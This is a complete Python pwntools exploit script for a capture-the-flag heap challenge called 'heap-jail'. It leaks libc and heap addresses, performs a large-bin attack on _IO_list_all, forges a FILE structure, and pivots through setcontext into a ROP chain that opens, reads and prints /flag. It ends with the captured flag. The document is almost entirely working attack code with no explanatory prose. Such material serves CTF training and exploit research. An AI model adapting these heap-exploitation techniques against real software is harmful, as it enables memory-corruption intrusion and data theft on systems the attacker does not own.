#!/usr/bin/env python3

from pwn import *

exe = ELF('./main_patched')
libc = ELF('./libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

def create(idx, size):
	sa(b"choose? \n", b"1\x00")
	sa(b"index: \n", f"{idx}".encode() + b"\x00")
	sa(b"size: \n", f"{size}".encode() + b"\x00")

def edit(idx, data):
	sa(b"choose? \n", b"2\x00")
	sa(b"index: \n", f"{idx}".encode() + b"\x00")
	sa(b"data: \n", data)

def delete(idx):
	sa(b"choose? \n", b"3\x00")
	sa(b"index: \n", f"{idx}".encode() + b"\x00")

def show(idx):
	sa(b"choose? \n", b"4\x00")
	sa(b"index: \n", f"{idx}".encode() + b"\x00")

script = '''
b *__rpc_thread_key_cleanup+53
'''

p = remote("heap-jail.chal.crewc.tf", 1337, ssl= True)
#p = process('./main_patched')
#p = gdb.debug('./main_patched', gdbscript = script)

# leak libc + heap
create(0, 0x500)
create(1, 0x500)
delete(0)
show(0)
libc_base = u64(p.recv(8)) - 0x203b20
lleak("libc_base", libc_base)
create(2, 0x28)
delete(2)
show(2)
heap_base = (u64(p.recv(8)) << 12)
lleak("heap_base", heap_base)
delete(1)

# large bin attack io list all
create(0, 0x428)
create(1, 0x508) # padding
create(2, 0x418)
create(3, 0x508) # padding
delete(0)
create(4, 0x438)
delete(2)

_IO_list_all = libc_base + libc.symbols['_IO_list_all']
payload = p64(libc_base + 0x203f50) * 2 + p64(heap_base + 0x35c0) + p64(_IO_list_all - 0x20)
edit(0, payload)
create(5, 0x438)

# prepare chunk to pivot
fileptr = heap_base + 0x3f00
callgadget = libc_base + 0x0000000000176f0e # mov rdx, qword ptr [rax + 0x38] ; mov rdi, rax ; call qword ptr [rdx + 0x20]
setcontext_gadget = libc_base + 0x4a99d
binsh = libc_base + list(libc.search(b'/bin/sh\x00'))[0]
pop_rax = libc_base + 0x00000000000dd237
syscall_ret = libc_base + 0x98fb6
xchg_rdi_rax_cld = libc_base + 0x000000000019e321
pop_rdi = libc_base + 0x000000000010f75b
pop_rsi = libc_base + 0x0000000000110a4d
pop_rdx_4dummy = libc_base + 0x00000000000b503c

heap = heap_base
base = heap + 0x3a00
# rop chain at begin 
payload = b"\x00"
payload = payload.ljust(0x20, b"A")
payload += p64(setcontext_gadget) # <-- [rdx + 0x20]

payload += p64(0)                 # <-- [rdx + 0x28] = r8
payload += p64(0)                 # <-- [rdx + 0x30] = r9
payload += b"A"*0x10              # padding
payload += p64(0)                 # <-- [rdx + 0x48] = r12
payload += p64(0)                 # <-- [rdx + 0x50] = r13
payload += p64(0)                 # <-- [rdx + 0x58] = r14
payload += p64(0)                 # <-- [rdx + 0x60] = r15
payload += p64(base + 0x188)      # <-- [rdx + 0x68] = rdi (ptr to flag path)
payload += p64(0)                 # <-- [rdx + 0x70] = rsi (flag = O_RDONLY)
payload += p64(0)                 # <-- [rdx + 0x78] = rbp
payload += p64(0)                 # <-- [rdx + 0x80] = rbx
payload += p64(0)                 # <-- [rdx + 0x88] = rdx 
payload += b"A"*8                 # padding
payload += p64(0)                 # <-- [rdx + 0x98] = rcx 
payload += p64(base + 0xa0)      # <-- [rdx + 0xa0] = rsp, perfectly setup for it to ret into our chain
payload += p64(pop_rax)           # <-- [rdx + 0xa8] = rcx, will be pushed to rsp

payload += p64(2)
payload += p64(syscall_ret) # sys_open("/path/to/flag", O_RDONLY)
payload += p64(xchg_rdi_rax_cld)
payload += p64(pop_rsi)
payload += p64(heap + 0x2000) # destination buffer, can be anywhere readable and writable
payload += p64(pop_rdx_4dummy)
payload += p64(0x100) + p64(0) * 4 # nbytes
payload += p64(pop_rax)
payload += p64(0)
payload += p64(syscall_ret) # sys_read(eax, heap + 0x2000, 0x100)
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi)
payload += p64(heap + 0x2000) # buffer
payload += p64(pop_rdx_4dummy)
payload += p64(0x100) + p64(0) * 4 # nbytes
payload += p64(pop_rax)
payload += p64(1)
payload += p64(syscall_ret) # sys_write(1, heap + 0x2000, 0x100)
payload += b"/flag\x00"

# end of chunk
payload = payload.ljust(0x4a8, b"A") # rax will point to here
payload += b"B" * 0x38 + p64(heap_base + 0x3a00) # rdx = [rax + 0x38] = notes[1]
payload = payload.ljust(0x500, b"A")

# prepare fake file struct
edit(1, payload + p64(0xfbad2484)) # flag
fp = FileStructure()
fp._IO_read_end = callgadget
fp._IO_write_base = 0
fp._IO_write_ptr = 1
fp._lock = fileptr + 0x1000
fp._wide_data = fileptr
fp.vtable = libc_base  + libc.symbols['_IO_wfile_jumps']
payload = bytes(fp) + p64(fileptr + 0x10 - 0x68)
edit(2, payload[0x10::])

#debug()

#exit
show(0x14)

p.interactive()
#crew{L4rg3B1ns_FTW_f70c8418155de82fae43}
